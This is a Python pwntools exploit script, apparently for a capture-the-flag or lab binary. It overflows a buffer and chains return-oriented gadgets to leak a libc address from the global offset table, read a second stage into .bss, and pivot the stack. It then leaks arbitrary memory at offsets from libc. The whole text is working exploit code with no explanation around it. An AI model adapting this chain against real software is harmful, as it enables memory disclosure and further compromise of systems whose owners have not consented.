from pwn import *

assert(args.OFFSET)
assert(args.LEAK_OFFSET)
assert(args.LEAK_SIZE)

offset = int(args.OFFSET, 10)
leak_offset = int(args.LEAK_OFFSET, 16)
leak_size = int(args.LEAK_SIZE, 16)

binfile = './a.out'
context.binary = elf = ELF(binfile)
context.log_level = 'critical'
libc = elf.libc

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug(binfile, gdbscript = gs)
    else:
        return process(binfile)

set_regs = 0x40120a # pop rbx, rbp, r12, r13, r14, r15; ret;
call_r15 = 0x4011f0

# stage1: information leak and get libc base
rop = ROP(binfile)
rop.raw(pack(set_regs))
rop.raw(0)
rop.raw(1)
rop.raw(1) # set to rdi
rop.raw(pack(elf.got['__libc_start_main'])) # set to rsi
rop.raw(8) # set to rdx
rop.raw(pack(elf.got['write'])) # set to r15
rop.raw(pack(call_r15))

#stage2: read input from stdin into .bss
bss = elf.bss() + 0x800 #
rop.raw(pack(0xdeadbeef))
rop.raw(0)
rop.raw(1)
rop.raw(0) # set to rdi
rop.raw(pack(bss)) # set to rsi
rop.raw(pack(400)) # set to rdx
rop.raw(pack(elf.got['read'])) # set to r15
rop.raw(pack(call_r15))

# stage3: stack pivot and execute ROP chain
rop.raw(pack(0xdeadbeef))
rop.raw(0)
rop.raw(pack(bss)) # set to rbp
rop.raw(pack(0xdeadbeef))
rop.raw(pack(0xdeadbeef))
rop.raw(pack(0xdeadbeef))
rop.raw(pack(0xdeadbeef))
rop.raw(rop.find_gadget(['leave', 'ret']))

# create payload
payload = b'a' * offset 
payload += rop.chain()

# start attack
io = start()
io.send(pack(len(payload), word_size = 32))
io.send(payload)
io.recv(len(payload))
libc_start_main = unpack(io.recv(8))
print(f'libc_start_main: {hex(libc_start_main)}')

leak_addr = libc_start_main + leak_offset
print(f'leak_addr: {hex(leak_addr)}')
rop = ROP(libc)
rop.raw(pack(0xdeadbeef))
rop.raw(pack(set_regs))
rop.raw(0)
rop.raw(1)
rop.raw(1) # set to rdi
rop.raw(pack(leak_addr)) # set to rsi
rop.raw(pack(leak_size)) # set to rdx
rop.raw(pack(elf.got['write'])) # set to r15
rop.raw(pack(call_r15))

payload = rop.chain()
io.send(payload)
print(io.recv())


